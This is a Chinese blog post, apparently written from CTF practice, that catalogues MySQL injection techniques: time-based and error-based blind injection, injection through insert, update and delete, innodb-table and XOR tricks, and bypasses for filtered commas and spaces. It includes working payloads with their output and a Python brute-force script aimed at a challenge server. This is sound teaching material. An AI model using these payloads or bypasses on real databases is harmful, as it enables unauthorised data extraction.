
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SQL注入有趣姿势总结 | 离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="文章首发于先知 五种时间盲注姿势 sleep()函数 benchmark函数  1BENCHMARK(count,expr)  benchmark函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下： 可以看到通过重复计算延时了1.90s  笛卡尔积盲注  注入姿势 123456789101112131415161718mysql&gt; SELECT">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入有趣姿势总结">
<meta property="og:url" content="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="og:description" content="文章首发于先知 五种时间盲注姿势 sleep()函数 benchmark函数  1BENCHMARK(count,expr)  benchmark函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下： 可以看到通过重复计算延时了1.90s  笛卡尔积盲注  注入姿势 123456789101112131415161718mysql&gt; SELECT">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png">
<meta property="og:image" content="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/Zmk139.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png">
<meta property="article:published_time" content="2019-06-28T23:12:56.000Z">
<meta property="article:modified_time" content="2019-06-28T23:14:24.000Z">
<meta property="article:author" content="离怀秋">
<meta property="article:tag" content="WEB安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main"><article id="post-SQL注入有趣姿势总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2019-06-28T23:12:56.000Z" itemprop="datePublished">2019-06-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      SQL注入有趣姿势总结
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>文章首发于先知</p>
<h3 id="五种时间盲注姿势"><a href="#五种时间盲注姿势" class="headerlink" title="五种时间盲注姿势"></a>五种时间盲注姿势</h3><ul>
<li><strong>sleep()函数</strong></li>
<li><strong>benchmark函数</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br><a href="https://imgchr.com/i/ZZi7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png" alt="ZZi7GR.md.png"></a></p>
<p>可以看到通过重复计算延时了<code>1.90s</code></p>
<ul>
<li><strong>笛卡尔积盲注</strong></li>
</ul>
<p>注入姿势</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>利用<code>and短路运算规则</code>进行时间盲注。</p>
<ul>
<li><strong>GET_LOCK盲注</strong></li>
</ul>
<p><code>get_lock</code>函数官方文档中的介绍</p>
<p><a href="https://imgchr.com/i/ZZAQbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png" alt="ZZAQbT.md.png"></a></p>
<p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p>
<p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p>
<p><code>SESSION A</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>SESSION B</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>同样的盲注利用手法。</p>
<ul>
<li><strong>正则<code>DOS</code> RLIKE注入</strong></li>
</ul>
<p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p>
<p>利用手法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#39;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p>
<ul>
<li><strong>mysql列名重复报错</strong></li>
</ul>
<p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p>
<p>Name_const函数用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1);</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.47 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>报错用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1),name_const(version(),1);;</span><br><span class="line">+--------+--------+</span><br><span class="line">| 5.5.47 | 5.5.47 |</span><br><span class="line">+--------+--------+</span><br><span class="line">|      1 |      1 |</span><br><span class="line">+--------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select name_const(version(),1),name_const(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;5.5.47&#39;</span><br></pre></td></tr></table></figure>

<p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test a join ctf_test b;</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| user | pwd          | user | pwd          |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| 1    | 0            | 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 1    | 0            |</span><br><span class="line">| 1    | 0            | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b )x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;user&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;pwd&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user,pwd))x;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>xpath语法报错与整数溢出报错的区别</strong></li>
</ul>
<p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p>
<p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p>
<p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(999,999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and pow(999,999);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p>
<ul>
<li><strong>整数溢出报错函数</strong></li>
</ul>
<p>pow(),cot(),exp()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and pow(988888,999999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(988888,999999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用几何函数进行报错注入</strong></li>
</ul>
<p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and polygon(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and linestring(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>对于insert,delete,update三种操作的注入</strong></li>
</ul>
<p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p>
<p><strong>报错注入</strong></p>
<p>insert报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&#39;,&#39;2&#39;);</span><br></pre></td></tr></table></figure>

<p>update报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctf_test set user&#x3D;1 where pwd&#x3D;&#39;2&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br></pre></td></tr></table></figure>

<p>delete报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from ctf_test where user&#x3D;&#39;1&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<p>insert类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; and sleep(3) and &#39;&#39;,&#39;2&#39;);</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>delete和update也都是一样的，就不一 一列举了。</p>
<h3 id="另类注入姿势以及对关键词过滤的绕过"><a href="#另类注入姿势以及对关键词过滤的绕过" class="headerlink" title="另类注入姿势以及对关键词过滤的绕过"></a>另类注入姿势以及对关键词过滤的绕过</h3><ul>
<li><code>order by</code> 盲注</li>
</ul>
<p>题目例子：ISCC web5</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt="img"></p>
<p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p>
<p>web5对应脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://39.100.83.188:8054/'</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"lihuaiqiu Union.373"</span>&#125;</span><br><span class="line">payload=<span class="string">"union_373_Tom' union select 1,2,0x&#123;&#125; order by 3,2,'1"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;<span class="string">"username"</span>:payload.format((flag+chr(j)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'233'</span>&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"union_373_Tom"</span> in lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>MySQL数据库的Innodb引擎的注入</strong></li>
</ul>
<p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p>
<p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p>
<p>所以可以通过查找这两个表取代information的作用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;database();</span><br><span class="line">+----------------+</span><br><span class="line">| flag           |</span><br><span class="line">+----------------+</span><br><span class="line">| 1              |</span><br><span class="line">| flag,flag,flag |</span><br><span class="line">+----------------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>无列名注入</li>
</ul>
<p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p>
<p><a href="https://imgchr.com/i/ZZgHQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png" alt="ZZgHQU.md.png"></a></p>
<ul>
<li>异或注入</li>
</ul>
<p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;s&#39;)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;r&#39;)^1;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>同等功能替换</li>
</ul>
<p>空格绕过：%0a,/**/.</p>
<p>关键函数过滤：</p>
<p>substr等价于left ,mid,substring</p>
<p>group_concat等价于concat_ws</p>
<ul>
<li>逗号被过滤</li>
</ul>
<p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p>
<p><strong>union select 逗号被过滤掉</strong></p>
<p>利用join注入，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; union select * from (select 1)a join (select 2)b;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 1    | 2            |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>功能函数逗号被过滤</strong></p>
<p>利用<code>from...for...</code>进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;r&#39;,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;s&#39;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>limit中逗号被过滤</strong></p>
<p>利用<code>limit..offset</code>进行绕过</p>
<p><code>limit 9 offset 4</code>表示从第十行开始返回4行，返回的是<code>10,11,12,13</code></p>
